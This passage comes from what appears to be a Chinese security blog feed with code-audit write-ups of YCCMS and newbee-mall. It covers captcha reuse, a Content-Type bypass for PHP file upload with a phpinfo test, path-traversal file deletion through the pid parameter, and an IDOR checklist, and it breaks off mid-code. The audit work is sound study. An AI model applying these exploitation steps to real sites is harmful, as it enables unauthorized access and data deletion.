#E5C07B">PDOException</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$e</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">exit</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;SQL语句:&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$_sql</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;&lt;br /&gt;错误信息:&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$e</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">getMessage</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$_stmt</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id&#x3D;1的数据，<strong>没有对于用户的信息进行认证以及过滤</strong>，这也就造成了任意更改管理员账号密码</p></li></ol><h3 id="3（验证码复用）"><a href="#3（验证码复用）" class="headerlink" title="3（验证码复用）"></a>3（验证码复用）</h3><p>直接测试抓包两次</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/admin/?a=login</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">m</span><span style="color: #56B6C2">=</span><span style="color: #98C379">ajaxCode</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">yccms:85</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span><span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span><span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">9</span></span><span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://yccms:85</span></span><span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span><span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://yccms:85/admin/?a=login</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PHPSESSID=o4og4hf5dqn67ns6pm8vlsfhdd</span></span><span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">code</span><span style="color: #56B6C2">=</span><span style="color: #98C379">gka3</span></span></code></pre></div></div></figure><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/admin/?a=login</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">yccms:85</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span><span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">text/html,application/xhtml+xml,application/xml</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.9</span><span style="color: #98C379">,</span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span></span><span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span></span><span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">68</span></span><span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://yccms:85</span></span><span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span><span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://yccms:85/admin/?a=login</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">PHPSESSID=o4og4hf5dqn67ns6pm8vlsfhdd</span></span><span class="line"><span style="color: #61AFEF">Upgrade-Insecure-Requests:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span></span><span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span><span style="color: #98C379">,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">i</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">ajaxlogin</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">ajaxcode</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">username</span><span style="color: #56B6C2">=</span><span style="color: #98C379">admin</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">password</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1234565</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">code</span><span style="color: #56B6C2">=</span><span style="color: #98C379">kugk</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">send</span><span style="color: #56B6C2">=</span></span></code></pre></div></div></figure><p>两次的Cookie: PHPSESSID&#x3D;o4og4hf5dqn67ns6pm8vlsfhdd相同</p><h3 id="4（文件上传1）"><a href="#4（文件上传1）" class="headerlink" title="4（文件上传1）"></a>4（文件上传1）</h3><p>登录后文件后台，上传logo存在文件上传（使用hacbar）</p><p>测试<a href="https://yccms:85/view/index/images/logo.php">https://yccms:85/view/index/images/logo.php</a>        </p><p>​ post提交1&#x3D;phpinfo（）；</p><p>​ 展现出配置文件</p><p>说明漏洞存在</p><ol><li><p>controller&#x2F;CallAction.class.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//处理上传图片</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">upLoad</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;send&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_logoupload</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LogoUpload</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;pic&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;MAX_FILE_SIZE&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_path</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$_logoupload</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">getPath</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_img</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Image</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_path</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_img</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">xhImg</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">960</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_img</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">out</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">//echo $_path;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_logoupload</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">alertOpenerClose</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;图片上传成功！&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;..&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$_path</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">exit</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;警告：文件过大或者其他未知错误导致浏览器崩溃！&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>回溯logoupload（public&#x2F;class&#x2F;LogoUpload.class.php）</p><p>寻找验证类型</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$type</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//类型</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$typeArr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;image/png&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;image/x-png&#39;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//类型合集</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//验证类型</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">checkType</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!in_array</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">type</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">typeArr</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">Tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">alertBack</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;警告：LOGO图片必须是PNG格式！&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>代码的“类型”“类型合集”表示只限制了<code>Content-Type</code></p></li><li><p>在提交log时，抓包修改<code>Content-Type</code>为PNG格式，image&#x2F;png</p></li></ol><h3 id="5（文件上传2）"><a href="#5（文件上传2）" class="headerlink" title="5（文件上传2）"></a>5（文件上传2）</h3><p>登录后文件后台，添加文章，上传图片存在文件上传（使用hacbar）</p><p>同上</p><p>​  （controller&#x2F;CallAction.class.php———–&gt;public\class\FileUpload.class.php）</p><p>​代码的“类型”“类型合集”表示只限制了<code>Content-Type</code></p><p>​在提交log时，抓包修改<code>Content-Type</code>为PNG格式，image&#x2F;png</p><h3 id="6（任意文件（图片-文章）删除）"><a href="#6（任意文件（图片-文章）删除）" class="headerlink" title="6（任意文件（图片&#x2F;文章）删除）"></a>6（任意文件（图片&#x2F;文章）删除）</h3><p>后台中，在图片管理处删除图片&#x2F;文章</p><ol><li><p>根据url（&#x2F;admin&#x2F;?a&#x3D;pic&amp;m&#x3D;delall）定位文件（&#x2F;controller&#x2F;PicAction.class.php）</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">delall</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;send&#39;</span><span style="color: #ABB2BF">])){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">validate</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">isNullString</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;pid&#39;</span><span style="color: #ABB2BF">])) </span><span style="color: #E5C07B">tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">layer_alert</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;没有选择任何图片!&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;?a=pic&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">7</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_fileDir</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">ROOT_PATH</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">&#39;/uploads/&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">foreach</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;pid&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">as</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$_value</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_filePath</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">$_fileDir</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$_value</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">!unlink</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_filePath</span><span style="color: #ABB2BF">)){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">layer_alert</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;图片删除失败,请设权限为777!&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;?a=pic&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">7</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span><span style="color: #C678DD">else</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">header</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Location:?a=pic&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>对 pid传进来的值并<strong>没有进行过滤就进行了了路径的拼接</strong>，导致了路径穿越漏洞，触发任意文件删除漏洞</p></li><li><p>即**只需要更改pid[0]**即可在无登录条件下任意删除文件</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>newbee mall搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/newbee%20mall%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/newbee%20mall%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建："><a href="#搭建：" class="headerlink" title="搭建："></a>搭建：</h1><p>我用的是IDEA</p><ol><li><p>下载源码</p><p>链接如下：<a href="https://github.com/newbee-ltd/newbee-mall">https://github.com/newbee-ltd/newbee-mall</a></p><p>直接在github下载即可</p></li><li><p>在phpstudy打开web环境，新建数据库，如下：（<strong>数据库名称一定要是newbee_mall_db</strong>）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162925796.png" alt="image-20250929102955907"></p></li><li><p>然后导入sql文件（源码包里面就有）</p><p>记得先修改这个配置文件<code>（修改数据库名和用户名）</code></p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162930502.png" alt="image-20250926153103159" style="zoom:50%;" /><p>然后导入即可</p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">\newbee-mall-master\src\main\resources\newbee_mall_schema.sql</span></span></code></pre></div></div></figure></li><li><p>在Navicat Premium 17连接数据库</p><p> <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162944166.png" alt="image-20250929103058046"></p></li><li><p>弹出即说明成功启动</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162946291.png" alt="image-20250926153457729"></p></li><li><p>直接输入</p><p><a href="http://localhost:28089/%E5%8D%B3%E5%8F%AF">http://localhost:28089/即可</a></p></li></ol><h1 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h1><h2 id="初审"><a href="#初审" class="headerlink" title="初审"></a>初审</h2><p><strong>先看pom.xml配置文件以及README.md</strong></p><ol><li><p>README.md中存在<strong>MyBatis</strong>，可能存在sql注入</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162948432.png" alt="image-20250929104432693"></p></li><li><p>通过搜索发现存在拦截器<strong>interceptor</strong>，可能存在越权漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162949866.png" alt="image-20250929104637782"></p></li><li><p>controller目录中也可能存在越权漏洞，下面具体审计可以跟着看一下</p><p>水平越权漏洞</p><ul><li>或者在篡改相关参数（请求参数 &#x2F; 表单字段 &#x2F; JSON 字段）</li><li>要么就是修改之中存在注入点，需要替换用户</li><li>在url使用参数切换用户或者管理员id未校验，尝试替换 ID（+1、-1、随机大&#x2F;小 ID、其它已知用户的 ID）</li><li>文件&#x2F;图片等直接用可访问 URL，访问其它用户的文件路径或修改 URL（没有权限校验或短期 token）</li><li>token 换取其他用户的数据</li><li>直接访问管理&#x2F;内部接口，扫列出隐藏路由、尝试访问 <code>/admin</code>、<code>/internal</code>、<code>/debug</code></li></ul></li></ol><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><ol><li><p>接上面说的，存在MyBatis，直接检索${，主要是查看${} 拼接 SQL 语句</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162953339.png" alt="image-20251014104614955"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163139933.png" alt="image-20251014104622698"></p><p>都找不到和sql相关的东西</p><p>说明可能使用<code>#代替$</code>实现sql的预编译，防止了sql注入（可能是版本问题，这个漏洞修复了emmm）</p></li><li><p>查找<code>#&#123;</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162956964.png" alt="image-20251014105140910"></p><p>进去分析一下</p><p>使用了直接拼接的方式向数据库进行查询（但是预编译即已修复）</p></li><li><p>所以可以查看NewBeeMallGoodsMapper.java <strong>（逆向追踪）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162958998.png" alt="image-20251014145410972"></p><p>找到传参定义，跟近函数</p></li><li><p>跟进到getTotalNewBeeMallGoods</p><p>C:\Users\95227\Desktop\newbee-mall-master\src\main\java\ltd\newbee\mall\service\impl\NewBeeMallGoodsServiceImpl.java</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PageResult</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getNewBeeMallGoodsPage</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">PageQueryUtil</span><span style="color: #E06C75"> pageUtil) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">NewBeeMallGoods</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> goodsList </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">goodsMapper</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">findNewBeeMallGoodsList</span><span style="color: #ABB2BF">(pageUtil);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> total </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">goodsMapper</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getTotalNewBeeMallGoods</span><span style="color: #ABB2BF">(pageUtil);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">PageResult</span><span style="color: #E06C75"> pageResult </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">PageResult</span><span style="color: #E06C75">(goodsList</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> total</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">pageUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getLimit</span><span style="color: #ABB2BF">(),</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">pageUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPage</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> pageResult</span><span 